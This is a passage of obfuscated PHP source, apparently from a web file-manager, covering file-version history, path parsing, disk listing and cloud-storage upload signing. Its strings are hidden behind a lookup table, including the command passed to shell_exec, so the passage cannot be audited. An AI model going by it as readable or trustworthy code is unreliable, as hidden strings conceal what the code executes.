self::listData($Öå‚àŞß, !1); if (!$ò’¥Ä¸‰ || !$ò’¥Ä¸‰[$é‡õîº[369]]) { return !1; } $  ¨˜³‰ = $é‡õîº[1227]; $ì §Õ™• = $ì §Õ™• ? $ì §Õ™• : get_path_this($Öå‚àŞß); $¾ï®´¤â = $¾ï®´¤â ? $¾ï®´¤â : $ò’¥Ä¸‰[$é‡õîº[1239]]; $§¾ç§Â = substr(get_path_this($ò’¥Ä¸‰[$é‡õîº[1240]]), 0, -strlen($  ¨˜³‰)); foreach ($ò’¥Ä¸‰[$é‡õîº[369]] as $ÁşÍ°ï => $‡Á˜ÓòÔ) { $œØé²˜„ = $ì §Õ™• . substr($‡Á˜ÓòÔ[$é‡õîº[32]], strlen($§¾ç§Â)); $ŸÜ¯‘õÛ = IO::move($ò’¥Ä¸‰[$é‡õîº[1239]] . $‡Á˜ÓòÔ[$é‡õîº[32]], $¾ï®´¤â, !1, $œØé²˜„); if ($ŸÜ¯‘õÛ) { $ò’¥Ä¸‰[$é‡õîº[369]][$ÁşÍ°ï][$é‡õîº[32]] = $œØé²˜„; } } $ò’¥Ä¸‰[$é‡õîº[1240]] = IO::move($ò’¥Ä¸‰[$é‡õîº[1240]], $¾ï®´¤â, !1, $ì §Õ™• . $  ¨˜³‰); self::saveData($ò’¥Ä¸‰[$é‡õîº[1240]], $ò’¥Ä¸‰[$é‡õîº[369]]); self::clearEmptyFolder($ò’¥Ä¸‰[$é‡õîº[1239]]); } public static function rollback($Ä‰ä¨Ì, $Œëğ© …) { $µ€¸×¼ =& $_SERVER[­á Ş³Ö]; $–¸Äü±Ú = self::listData($Ä‰ä¨Ì); if (!$–¸Äü±Ú) { return; } $«Í”Õè = IO::info($Ä‰ä¨Ì); foreach ($–¸Äü±Ú[$µ€¸×¼[369]] as $ÓÖ¦ÅÙ® => $ÔâÌ¨ïŒ) { if ($ÔâÌ¨ïŒ[$µ€¸×¼[399]] == $Œëğ© …) { self::add($Ä‰ä¨Ì); $¬é«¢ş = $–¸Äü±Ú[$µ€¸×¼[1239]] . $ÔâÌ¨ïŒ[$µ€¸×¼[32]]; $‰¬Ò¶¼ğ = IO::copy($¬é«¢ş, IO::pathFather($Ä‰ä¨Ì), REPEAT_REPLACE, $«Í”Õè[$µ€¸×¼[32]]); if ($‰¬Ò¶¼ğ) { self::remove($Ä‰ä¨Ì, $Œëğ© …); } return $‰¬Ò¶¼ğ; } } return !1; } public static function setDetail($Òè©‹ÀÒ, $Ğğ†­æé, $šüö»á´) { $¯¥Ñ¸šÙ =& $_SERVER[­á Ş³Ö]; $Ü÷÷òÈ” = self::listData($Òè©‹ÀÒ); if (!$Ü÷÷òÈ”) { return; } foreach ($Ü÷÷òÈ”[$¯¥Ñ¸šÙ[369]] as $‡áÑÇÍ => $Å’æû½) { if ($Å’æû½[$¯¥Ñ¸šÙ[399]] == $Ğğ†­æé) { $Ü÷÷òÈ”[$¯¥Ñ¸šÙ[369]][$‡áÑÇÍ][$¯¥Ñ¸šÙ[1238]] = $šüö»á´; self::saveData($Ü÷÷òÈ”[$¯¥Ñ¸šÙ[1240]], $Ü÷÷òÈ”[$¯¥Ñ¸šÙ[369]]); return !0; } } return !1; } public static function fileInfo($ô‹Åêœ›, $Úğ‹ß›¹) { $ÃÚŞ–éÖ =& $_SERVER[­á Ş³Ö]; $™–•ˆˆ® = self::listData($ô‹Åêœ›); if (!$™–•ˆˆ®) { show_json(LNG($ÃÚŞ–éÖ[105]), !1); } $Üí†ëêÖ = $ÃÚŞ–éÖ[12]; foreach ($™–•ˆˆ®[$ÃÚŞ–éÖ[369]] as $®ĞæŒê® => $İÜ€ßğ¼) { if ($İÜ€ßğ¼[$ÃÚŞ–éÖ[399]] != $Úğ‹ß›¹) { continue; } $Üí†ëêÖ = $™–•ˆˆ®[$ÃÚŞ–éÖ[1239]] . $İÜ€ßğ¼[$ÃÚŞ–éÖ[32]]; break; } if (!$Üí†ëêÖ) { show_json(LNG($ÃÚŞ–éÖ[105]), !1); } return IO::info($Üí†ëêÖ); } public static function fileOut($àÙ†ò²–, $—Õà©ªÏ, $–¬‡ ˆ¸ = false) { $—úœ ”û =& $_SERVER[­á Ş³Ö]; $­—ª‰ÎÈ = self::fileInfo($àÙ†ò²–, $—Õà©ªÏ); $½¥º’ç =& $GLOBALS[$—úœ ”û[7]]; $–¬‡ ˆ¸ = isset($½¥º’ç[$—úœ ”û[1190]]) && $½¥º’ç[$—úœ ”û[1190]] == 1; if (isset($½¥º’ç[$—úœ ”û[33]]) && $½¥º’ç[$—úœ ”û[33]] == $—úœ ”û[1241]) { return IO::fileOutImage($­—ª‰ÎÈ[$—úœ ”û[84]], $½¥º’ç[$—úœ ”û[1242]]); } IO::fileOut($­—ª‰ÎÈ[$—úœ ”û[84]], $–¬‡ ˆ¸, get_path_this($àÙ†ò²–)); } public static function listData($±ï•»œœ, $ö³Î†«ì = true) { $öûñÑ‚ =& $_SERVER[­á Ş³Ö]; if ($ö³Î†«ì && !IO::exist($±ï•»œœ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($±ï•»œœ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¼¤÷ÃùÕ = self::pathHistory($±ï•»œœ); $ñöÄ¨­ = array($öûñÑ‚[1240] => $¼¤÷ÃùÕ . $öûñÑ‚[1227], $öûñÑ‚[1239] => rtrim(get_path_father($¼¤÷ÃùÕ), $öûñÑ‚[8]) . $öûñÑ‚[8], $öûñÑ‚[369] => array()); $®É¿æõ¥ = IO::getContent($ñöÄ¨­[$öûñÑ‚[1240]]); if ($®É¿æõ¥) { $ëÑëœ÷Ğ = json_decode($®É¿æõ¥, !0); if (is_array($ëÑëœ÷Ğ)) { $ñöÄ¨­[$öûñÑ‚[369]] = $ëÑëœ÷Ğ; } } return $ñöÄ¨­; } private static function saveData($«´õÒüµ, $¡ËĞ˜¶Ï) { $Ôá‚‹ø =& $_SERVER[­á Ş³Ö]; self::log($Ôá‚‹ø[1243] . $«´õÒüµ . $Ôá‚‹ø[71] . count($¡ËĞ˜¶Ï), $Ôá‚‹ø[748]); if ($¡ËĞ˜¶Ï) { return IO::setContent($«´õÒüµ, json_encode($¡ËĞ˜¶Ï)); } $Ÿü¸—ÌŞ = IO::pathFather($«´õÒüµ); IO::remove($«´õÒüµ); self::clearEmptyFolder($Ÿü¸—ÌŞ); return !0; } public static function clearEmptyFolder($Êì£õ™û) { $€”ßû¾— =& $_SERVER[­á Ş³Ö]; if (trim($Êì£õ™û, $€”ßû¾—[8]) == trim(self::$_historyBase, $€”ßû¾—[8])) { return; } $ö©Œñ» = IO::pathFather($Êì£õ™û); $î¨ï¥ = IO::has($Êì£õ™û, !0); if ($î¨ï¥[$€”ßû¾—[207]] > 0 || $î¨ï¥[$€”ßû¾—[208]] > 0) { return; } IO::remove($Êì£õ™û); self::clearEmptyFolder($ö©Œñ»); } private static function getBasePath() { $ç °óå— =& $_SERVER[­á Ş³Ö]; $Ú‘®‰¡¯ = Model($ç °óå—[1244])->get($ç °óå—[1245]); if ($Ú‘®‰¡¯) { if (!IO::exist($Ú‘®‰¡¯)) { IO::mkdir($Ú‘®‰¡¯); } if (get_path_this($Ú‘®‰¡¯) == $ç °óå—[1230]) { $Œ¦Úâ‘» = $ç °óå—[1246] . rand_string(8); @rename($Ú‘®‰¡¯, get_path_father($Ú‘®‰¡¯) . $ç °óå—[8] . $Œ¦Úâ‘»); $Ú‘®‰¡¯ = DATA_PATH . $Œ¦Úâ‘» . $ç °óå—[8]; file_put_contents(DATA_PATH . $ç °óå—[1180], $ç °óå—[12]); Model($ç °óå—[1244])->set($ç °óå—[1245], $Ú‘®‰¡¯); } return $Ú‘®‰¡¯; } $Ú‘®‰¡¯ = DATA_PATH . $ç °óå—[1246] . rand_string(8) . $ç °óå—[8]; $Ú‘®‰¡¯ = IO::mkdir($Ú‘®‰¡¯); $Ú‘®‰¡¯ = rtrim($Ú‘®‰¡¯, $ç °óå—[8]) . $ç °óå—[8]; file_put_contents($Ú‘®‰¡¯ . $ç °óå—[1180], $ç °óå—[12]); file_put_contents(DATA_PATH . $ç °óå—[1180], $ç °óå—[12]); Model($ç °óå—[1244])->set($ç °óå—[1245], $Ú‘®‰¡¯); return $Ú‘®‰¡¯; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\122\145\x63\x79\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\145\x72\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\162\x46\151\x6c\x65\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\151\154\145\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\x52\x6f\x6f\x74\x53\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\x73\145\x72\x53\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\162\x53\150\141\162\x65\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\162\x65\x54\x6f\x4d\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\145\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\111\x74\145\x6d\114\x69\156\x6b\x7d"; const KOD_SEARCH = "\173\163\145\141\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\143\x6b\175"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\x7b\165\163\145\162\122\x65\x6e\x63\x65\x6e\164\175"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\x65\x72\175"; public static function typeList() { $²òÑ¹ï® =& $_SERVER[­á Ş³Ö]; return array($²òÑ¹ï®[1247] => self::KOD_SOURCE, $²òÑ¹ï®[1248] => self::KOD_USER_RECYCLE, $²òÑ¹ï®[1249] => self::KOD_USER_FAV, $²òÑ¹ï®[1250] => self::KOD_USER_FILE_TAG, $²òÑ¹ï®[1251] => self::KOD_USER_FILE_TYPE, $²òÑ¹ï®[1252] => self::KOD_GROUP_ROOT_SELF, $²òÑ¹ï®[1253] => self::KOD_USER_SHARE, $²òÑ¹ï®[1254] => self::KOD_USER_SHARE_LINK, $²òÑ¹ï®[1255] => self::KOD_USER_SHARE_TO_ME, $²òÑ¹ï®[1256] => self::KOD_SHARE_ITEM, $²òÑ¹ï®[1257] => self::KOD_SHARE_LINK, $²òÑ¹ï®[1258] => self::KOD_SEARCH, $²òÑ¹ï®[1259] => self::KOD_BLOCK, $²òÑ¹ï®[1260] => self::KOD_IO, $²òÑ¹ï®[1261] => self::KOD_USER_RECENT, $²òÑ¹ï®[1262] => self::KOD_USER_DRIVER); } public static function parse($˜Ó¦…Ï) { $œÈæ½ÑÇ =& $_SERVER[­á Ş³Ö]; $˜Ó¦…Ï = self::clear($˜Ó¦…Ï); $§ˆ¿ŒœÙ = array_values(self::typeList()); preg_match($œÈæ½ÑÇ[1263], $˜Ó¦…Ï, $öÇ×‹–ı); $ğáäªìó = array($œÈæ½ÑÇ[422] => !1, $œÈæ½ÑÇ[1264] => !1, $œÈæ½ÑÇ[419] => !1, $œÈæ½ÑÇ[84] => $˜Ó¦…Ï, $œÈæ½ÑÇ[1165] => !1, $œÈæ½ÑÇ[1164] => $œÈæ½ÑÇ[12]); if (is_array($öÇ×‹–ı) && count($öÇ×‹–ı) == 5) { $–Şİİº‡ = $œÈæ½ÑÇ[1265] . $öÇ×‹–ı[2] . $œÈæ½ÑÇ[327]; if (in_array($–Şİİº‡, $§ˆ¿ŒœÙ)) { $ğáäªìó[$œÈæ½ÑÇ[1165]] = $öÇ×‹–ı[1]; $ğáäªìó[$œÈæ½ÑÇ[33]] = $–Şİİº‡; $ğáäªìó[$œÈæ½ÑÇ[1266]] = substr($–Şİİº‡, 1, -1); $ğáäªìó[$œÈæ½ÑÇ[399]] = $öÇ×‹–ı[3]; } $ğáäªìó[$œÈæ½ÑÇ[1164]] = $öÇ×‹–ı[4]; } $ıèœØÄ÷ = array($œÈæ½ÑÇ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ğáäªìó[$œÈæ½ÑÇ[1229]] = in_array($ğáäªìó[$œÈæ½ÑÇ[33]], $ıèœØÄ÷); return $ğáäªìó; } public static function isTruePath($³À¶¢ê¿) { $Ìõ•ŒÛá =& $_SERVER[­á Ş³Ö]; if (substr($³À¶¢ê¿, 0, 1) != $Ìõ•ŒÛá[1265]) { return !0; } if (strpos($³À¶¢ê¿, $Ìõ•ŒÛá[408]) === 0) { return !0; } if (strpos($³À¶¢ê¿, $Ìõ•ŒÛá[1233]) === 0) { return !0; } if (strpos($³À¶¢ê¿, $Ìõ•ŒÛá[1267]) === 0) { return !0; } if (strpos($³À¶¢ê¿, $Ìõ•ŒÛá[1268]) === 0) { return !0; } if (strpos($³À¶¢ê¿, $Ìõ•ŒÛá[1269]) === 0) { return !0; } return !1; } public static function clear($µ”Ş¬ÊŠ) { $Åìƒşªô =& $_SERVER[­á Ş³Ö]; $µ”Ş¬ÊŠ = str_replace(array($Åìƒşªô[1074], $Åìƒşªô[231]), $Åìƒşªô[53], $µ”Ş¬ÊŠ); $µ”Ş¬ÊŠ = str_replace($Åìƒşªô[97], $Åìƒşªô[8], $µ”Ş¬ÊŠ); $Âş†ğ· = $Åìƒşªô[1270]; if (substr($µ”Ş¬ÊŠ, 0, 3) == $Åìƒşªô[1271]) { $µ”Ş¬ÊŠ = substr($µ”Ş¬ÊŠ, 3); } while (strstr($µ”Ş¬ÊŠ, $Âş†ğ·)) { $µ”Ş¬ÊŠ = str_replace($Âş†ğ·, $Åìƒşªô[8], $µ”Ş¬ÊŠ); } $µ”Ş¬ÊŠ = preg_replace($Åìƒşªô[1272], $Åìƒşªô[8], $µ”Ş¬ÊŠ); if ($µ”Ş¬ÊŠ == $Åìƒşªô[8]) { return $Åìƒşªô[8]; } $µ”Ş¬ÊŠ = rtrim($µ”Ş¬ÊŠ, $Åìƒşªô[8]); return $µ”Ş¬ÊŠ; } public static function sourceID($´½¦ú¼˜) { $Ãôú¸äæ =& $_SERVER[­á Ş³Ö]; $°Æ£€õË = self::parse($´½¦ú¼˜); if ($°Æ£€õË[$Ãôú¸äæ[33]] !== self::KOD_SOURCE) { show_json(LNG($Ãôú¸äæ[1273]), !1); } return $°Æ£€õË[$Ãôú¸äæ[399]]; } public static function make($ïÉò¦ª›) { if (!$ïÉò¦ª›) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ïÉò¦ª›)); } public static function makeShare($ŠñÍ¬À, $Ó¡Ú©ç) { return self::makePath(self::KOD_SHARE_ITEM, $ŠñÍ¬À, $Ó¡Ú©ç); } public static function makeFileTypePath($‚ğ¬—Ş) { return self::makePath(self::KOD_USER_FILE_TYPE, $‚ğ¬—Ş); } public static function makeFileTagPath($î¦ò°ê…) { return self::makePath(self::KOD_USER_FILE_TAG, $î¦ò°ê…); } public static function makePath($Ü¦æ£ ·, $è÷ÓÅí = '', $ÅÓ«êı = '') { $¦ªö † =& $_SERVER[­á Ş³Ö]; $‡½­¡‰æ = substr($Ü¦æ£ ·, 1, -1); $ƒïí¦µç = $¦ªö †[1274] . $‡½­¡‰æ . $¦ªö †[1275] . $è÷ÓÅí . $¦ªö †[1276]; $ƒïí¦µç = $ÅÓ«êı ? $ƒïí¦µç . $ÅÓ«êı . $¦ªö †[8] : $ƒïí¦µç; return $ƒïí¦µç; } public static function hashPath($Ï¤£´¬ê, $ºÖªµŞÉ = true) { $èÒ°àÀ =& $_SERVER[­á Ş³Ö]; $Ã‹áèî› = is_array($Ï¤£´¬ê) ? $Ï¤£´¬ê : IO::info($Ï¤£´¬ê); $üŸàµî¼ = _get($Ã‹áèî›, $èÒ°àÀ[1277], $èÒ°àÀ[12]); if (!$üŸàµî¼ && isset($Ã‹áèî›[$èÒ°àÀ[402]])) { $Ã‹áèî› = IO::info(KodIO::make($Ã‹áèî›[$èÒ°àÀ[402]])); $üŸàµî¼ = _get($Ã‹áèî›, $èÒ°àÀ[1277], $èÒ°àÀ[12]); } if (!$üŸàµî¼ && $ºÖªµŞÉ) { $¨ƒ°›ÙÑ = KodIO::parse($Ã‹áèî›[$èÒ°àÀ[84]]); if (!$¨ƒ°›ÙÑ[$èÒ°àÀ[33]]) { $üŸàµî¼ = IO::hashSimple($Ã‹áèî›[$èÒ°àÀ[84]]); } } if (!$üŸàµî¼) { $üŸàµî¼ = md5($Ã‹áèî›[$èÒ°àÀ[84]] . $Ã‹áèî›[$èÒ°àÀ[76]] . $Ã‹áèî›[$èÒ°àÀ[85]]); } return $üŸàµî¼; } public static function hashPathSafe($õÅˆ‹, $ƒĞü¯ÓÖ = true) { $¬ÖîöéÃ =& $_SERVER[­á Ş³Ö]; $¦é†Í÷Î = self::hashPath($õÅˆ‹, $ƒĞü¯ÓÖ); return md5($¦é†Í÷Î . $¬ÖîöéÃ[1278] . Model($¬ÖîöéÃ[767])->get($¬ÖîöéÃ[768])); } public static function initSystemPath() { $ÏĞÙúç¸ =& $_SERVER[­á Ş³Ö]; if (defined($ÏĞÙúç¸[1279])) { return; } define($ÏĞÙúç¸[1279], self::systemPath($ÏĞÙúç¸[1280])); define($ÏĞÙúç¸[1281], self::systemPath($ÏĞÙúç¸[1282])); define($ÏĞÙúç¸[1283], self::systemPath($ÏĞÙúç¸[1284])); define($ÏĞÙúç¸[1285], self::systemPath($ÏĞÙúç¸[1286])); IOHistory::bindEvent(); } public static function systemPath($‹¾Î õÉ) { $¼ûùòø¹ =& $_SERVER[­á Ş³Ö]; $àÖŒıæÙ = $¼ûùòø¹[1287] . ucfirst($‹¾Î õÉ); $¸ø—èşÀ = Model($¼ûùòø¹[767])->get($àÖŒıæÙ); if ($¸ø—èşÀ) { return $¸ø—èşÀ; } if ($‹¾Î õÉ == $¼ûùòø¹[1280]) { $¸ø—èşÀ = self::make(Model($¼ûùòø¹[822])->systemRootPathAdd($¼ûùòø¹[534])); } else { $¸ø—èşÀ = self::systemPath($¼ûùòø¹[1280]); $” ²‰òœ = self::sourceID($¸ø—èşÀ); $¸ø—èşÀ = self::make(Model($¼ûùòø¹[822])->mkdir($” ²‰òœ, $‹¾Î õÉ)); } Model($¼ûùòø¹[767])->set($àÖŒıæÙ, $¸ø—èşÀ); return $¸ø—èşÀ; } public static function systemFolder($×ˆÉõ¡) { $¦˜íáÌ = IO_PATH_SYSTEM_SOURCE . $×ˆÉõ¡; $Ô÷†ıµ’ = Cache::get($¦˜íáÌ); if (!$Ô÷†ıµ’) { $Í…´Û¬Ø = IO::infoFull($¦˜íáÌ); if (!$Í…´Û¬Ø) { $Ô÷†ıµ’ = IO::mkdir($¦˜íáÌ, REPEAT_SKIP); } else { $Ô÷†ıµ’ = $Í…´Û¬Ø[$_SERVER[­á Ş³Ö][84]]; } Cache::set($¦˜íáÌ, $Ô÷†ıµ’, 3600 * 10); } return $Ô÷†ıµ’; } public static function defaultDriver() { return Model($_SERVER[­á Ş³Ö][764])->defaultDriver(); } public static function defaultIO() { $µ³Ã—¬Ğ =& $_SERVER[­á Ş³Ö]; $û·î¨« = self::defaultDriver(); return $µ³Ã—¬Ğ[1288] . $û·î¨«[$µ³Ã—¬Ğ[399]] . $µ³Ã—¬Ğ[1276]; } public static function defaultDriverInit() { static $¯Ã‹•î = false; if ($¯Ã‹•î) { return $¯Ã‹•î; } $¯Ã‹•î = IO::init(self::defaultIO()); return $¯Ã‹•î; } public static function fileTypeList() { $Í»×õÊ… =& $_SERVER[­á Ş³Ö]; $“É½¿¼– = $GLOBALS[$Í»×õÊ…[6]][$Í»×õÊ…[1289]]; foreach ($“É½¿¼– as $Èšëş†™ => $€°óßš‘) { $ß±õÇ‡‚ = $Í»×õÊ…[1290] . $Èšëş†™; $¼àıÂÄÏ = LNG($ß±õÇ‡‚); if ($ß±õÇ‡‚ != $¼àıÂÄÏ) { $“É½¿¼–[$Èšëş†™][$Í»×õÊ…[32]] = $¼àıÂÄÏ; } } return $“É½¿¼–; } public static function diskList($½’úÇí© = true) { $ÖÙĞÀæ = $_SERVER[­á Ş³Ö][1291]; if ($½’úÇí©) { $ÄêÁ›‚– = Cache::get($ÖÙĞÀæ); if (is_array($ÄêÁ›‚–)) { return $ÄêÁ›‚–; } } $ÄêÁ›‚– = self::diskListGet(); Cache::set($ÖÙĞÀæ, $ÄêÁ›‚–, 60); return $ÄêÁ›‚–; } public static function diskListGet() { $ıÉÍı’ =& $_SERVER[­á Ş³Ö]; $Ì—øÕ€ß = array(); if ($GLOBALS[$ıÉÍı’[6]][$ıÉÍı’[1292]] == $ıÉÍı’[1293]) { $¸¹Ã…‰Î = $ıÉÍı’[1294]; for ($ššŞğ‘õ = 0; $ššŞğ‘õ < strlen($¸¹Ã…‰Î); $ššŞğ‘õ++) { $œíò¾ø± = $¸¹Ã…‰Î[$ššŞğ‘õ] . $ıÉÍı’[1295]; if (file_exists($œíò¾ø±)) { $Ì—øÕ€ß[] = $œíò¾ø±; } } return $Ì—øÕ€ß; } if (!function_exists($ıÉÍı’[98])) { $Ì—øÕ€ß[] = $ıÉÍı’[832]; return $Ì—øÕ€ß; } $ä§ºœ±Ù = explode($ıÉÍı’[231], shell_exec($ıÉÍı’[1296])); array_shift($ä§ºœ±Ù); array_pop($ä§ºœ±Ù); $›çÄ°÷Û = array($ıÉÍı’[1297], $ıÉÍı’[1298], $ıÉÍı’[1299], $ıÉÍı’[1300], $ıÉÍı’[1301], $ıÉÍı’[1302], $ıÉÍı’[1303], $ıÉÍı’[1304]); foreach ($ä§ºœ±Ù as $‡¥‡úƒ) { $•Ñ¢ê¶— = preg_split($ıÉÍı’[1305], $‡¥‡úƒ); $œíò¾ø± = $•Ñ¢ê¶—[count($•Ñ¢ê¶—) - 1]; if (!strstr($•Ñ¢ê¶—[0], $ıÉÍı’[1306]) || !$œíò¾ø±) { continue; } $ùòèÏ“ = rtrim($œíò¾ø±, $ıÉÍı’[8]) . $ıÉÍı’[8]; if (in_array($ùòèÏ“, $›çÄ°÷Û)) { continue; } $Ì—øÕ€ß[] = $ùòèÏ“; } return $Ì—øÕ€ß; } public static function isSameDisk($Õš—…í®, $‹èğãÂ€) { $¡¯Ê©ùÀ =& $_SERVER[­á Ş³Ö]; if ($GLOBALS[$¡¯Ê©ùÀ[6]][$¡¯Ê©ùÀ[1292]] == $¡¯Ê©ùÀ[1293]) { return strtolower(substr($Õš—…í®, 0, 1)) == strtolower(substr($‹èğãÂ€, 0, 1)); } $ÁÅîŒÇ‘ = self::diskList(); $æï£õ“ª = !1; $áÁøÉÙ‹ = !1; sort($ÁÅîŒÇ‘); $ÁÅîŒÇ‘ = array_reverse($ÁÅîŒÇ‘); $Õš—…í® = rtrim($Õš—…í®, $¡¯Ê©ùÀ[8]) . $¡¯Ê©ùÀ[8]; $‹èğãÂ€ = rtrim($‹èğãÂ€, $¡¯Ê©ùÀ[8]) . $¡¯Ê©ùÀ[8]; foreach ($ÁÅîŒÇ‘ as $íŸ˜¼ÛÀ) { $¡“Â¼¡Ô = strlen($íŸ˜¼ÛÀ); if (!$æï£õ“ª && substr($Õš—…í®, 0, $¡“Â¼¡Ô) == $íŸ˜¼ÛÀ) { $æï£õ“ª = $íŸ˜¼ÛÀ; } if (!$áÁøÉÙ‹ && substr($‹èğãÂ€, 0, $¡“Â¼¡Ô) == $íŸ˜¼ÛÀ) { $áÁøÉÙ‹ = $íŸ˜¼ÛÀ; } if ($æï£õ“ª && $áÁøÉÙ‹) { break; } } return $æï£õ“ª === $áÁøÉÙ‹; } public static function transferType($ú›íÑ¹œ, $ôù”¥—Û) { $«š¡Ğ°¥ =& $_SERVER[­á Ş³Ö]; $Ä¾¬¿µÉ = self::driverType($ú›íÑ¹œ); $§û®¯†Ê = self::driverType($ôù”¥—Û); if ($Ä¾¬¿µÉ[$«š¡Ğ°¥[33]] == $§û®¯†Ê[$«š¡Ğ°¥[33]] && $Ä¾¬¿µÉ[$«š¡Ğ°¥[1307]] == $§û®¯†Ê[$«š¡Ğ°¥[1307]]) { return $«š¡Ğ°¥[1308]; } if ($Ä¾¬¿µÉ[$«š¡Ğ°¥[33]] == $«š¡Ğ°¥[865] && $§û®¯†Ê[$«š¡Ğ°¥[33]] == $«š¡Ğ°¥[106]) { return $«š¡Ğ°¥[1190]; } if ($Ä¾¬¿µÉ[$«š¡Ğ°¥[33]] == $«š¡Ğ°¥[106] && $§û®¯†Ê[$«š¡Ğ°¥[33]] == $«š¡Ğ°¥[865]) { return $«š¡Ğ°¥[107]; } return $«š¡Ğ°¥[1309]; } public static function driverType($ŠÆÏòÛ…) { $…¥ï™Î¥ =& $_SERVER[­á Ş³Ö]; $Úô¤õÂ = str_replace($…¥ï™Î¥[1310], $…¥ï™Î¥[12], strtolower($ŠÆÏòÛ…->getType())); if ($Úô¤õÂ == $…¥ï™Î¥[754] || $Úô¤õÂ == $…¥ï™Î¥[1311] || $Úô¤õÂ == $…¥ï™Î¥[1312]) { $ŠÆÏòÛ… = self::defaultDriverInit(); } else { if ($Úô¤õÂ == $…¥ï™Î¥[1200] || $Úô¤õÂ == $…¥ï™Î¥[1313]) { $ŠÆÏòÛ… = IO::init($ŠÆÏòÛ…->pathParse[$…¥ï™Î¥[1147]]); } } $œº¼ø— = $ŠÆÏòÛ…->path; $Úô¤õÂ = str_replace($…¥ï™Î¥[1310], $…¥ï™Î¥[12], strtolower($ŠÆÏòÛ…->getType())); if ($Úô¤õÂ == $…¥ï™Î¥[106]) { return array($…¥ï™Î¥[33] => $…¥ï™Î¥[106], $…¥ï™Î¥[1307] => $…¥ï™Î¥[12], $…¥ï™Î¥[84] => $œº¼ø—, $…¥ï™Î¥[95] => $ŠÆÏòÛ…); } return array($…¥ï™Î¥[33] => $…¥ï™Î¥[865], $…¥ï™Î¥[1307] => $ŠÆÏòÛ…->pathDriver, $…¥ï™Î¥[84] => $œº¼ø—, $…¥ï™Î¥[95] => $ŠÆÏòÛ…); } public static function pathDriverType($ÀıĞ™Şô) { return $ÀıĞ™Şô ? self::driverType(IO::init($ÀıĞ™Şô)) : !1; } public static function pathDriverLocal($ï„³µĞ¦) { $Çª…¤“› =& $_SERVER[­á Ş³Ö]; $á¢¸¯°’ = $ï„³µĞ¦ ? self::driverType(IO::init($ï„³µĞ¦)) : !1; return $á¢¸¯°’[$Çª…¤“›[33]] == $Çª…¤“›[106] ? !0 : !1; } public static function allowCover($ƒı¾âúù, $šÙ¿¨Ç¼ = true) { $õÌËŠØ =& $_SERVER[­á Ş³Ö]; if (is_string($ƒı¾âúù)) { $ƒı¾âúù = IO::info($ƒı¾âúù); } if (!$ƒı¾âúù || $ƒı¾âúù[$õÌËŠØ[33]] == $õÌËŠØ[75] || $ƒı¾âúù[$õÌËŠØ[76]] <= 100) { return !1; } if (isset($ƒı¾âúù[$õÌËŠØ[1314]]) || !$ƒı¾âúù[$õÌËŠØ[84]]) { return !1; } if (isset($ƒı¾âúù[$õÌËŠØ[202]]) && !$ƒı¾âúù[$õÌËŠØ[202]]) { return $ƒı¾âúù; } static $ÅÎ•î¬ = false; if (!$ÅÎ•î¬ || !$šÙ¿¨Ç¼) { $éëıäªì = self::driverType(IO::init($ƒı¾âúù[$õÌËŠØ[84]])); $ŒÉšëÚ† = $éëıäªì[$õÌËŠØ[95]]; $ÅÎ•î¬ = $õÌËŠØ[1315]; if ($éëıäªì[$õÌËŠØ[33]] == $õÌËŠØ[106]) { $ÅÎ•î¬ = $õÌËŠØ[1316]; } if ($éëıäªì[$õÌËŠØ[95]] && is_array($éëıäªì[$õÌËŠØ[95]]->config)) { $ôşïÂ‘– = $éëıäªì[$õÌËŠØ[95]]->config; if (isset($ôşïÂ‘–[$õÌËŠØ[1317]]) && $ôşïÂ‘–[$õÌËŠØ[1317]]) { $ÅÎ•î¬ = $õÌËŠØ[1316]; } } } return $ÅÎ•î¬ == $õÌËŠØ[1316] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÄÏÒò…Î) { parent::__construct($ÄÏÒò…Î); $this->signatureVersion($_SERVER[­á Ş³Ö][216]); } public function uploadFormData($ş®ÈÍòø, $öñ­í¨³ = 3600) { $ÄÒ¯ßšÓ =& $_SERVER[­á Ş³Ö]; $¤‘Âš™ = $ÄÒ¯ßšÓ[199]; $™·£ĞöÇ = $ÄÒ¯ßšÓ[232]; $ŒøËõ¢î = $ÄÒ¯ßšÓ[1318]; $ùŸÍ§ = gmdate($ÄÒ¯ßšÓ[1319], time() + $öñ­í¨³); $ÏÏ²¾Ô½ = (string) time() . $ÄÒ¯ßšÓ[71] . (string) (time() + $öñ­í¨³); $Á±‘ó‘¥ = array($ÄÒ¯ßšÓ[1320] => $ùŸÍ§, $ÄÒ¯ßšÓ[1321] => array(array($ÄÒ¯ßšÓ[1322] => $¤‘Âš™), array($ÄÒ¯ßšÓ[1323] => $this->bucket), array($ÄÒ¯ßšÓ[1324], $ÄÒ¯ßšÓ[1325], $ÄÒ¯ßšÓ[12]), array($ÄÒ¯ßšÓ[1326] => $ŒøËõ¢î), array($ÄÒ¯ßšÓ[1327] => $™·£ĞöÇ), array($ÄÒ¯ßšÓ[1328] => $this->accessKey), array($ÄÒ¯ßšÓ[1329] => $ÏÏ²¾Ô½))); $Á±‘ó‘¥ = json_encode($Á±‘ó‘¥); $«Ôã¿ñ­ = hash_hmac($ÄÒ¯ßšÓ[232], $ÏÏ²¾Ô½, $this->secret); $×ª¤Ëê = 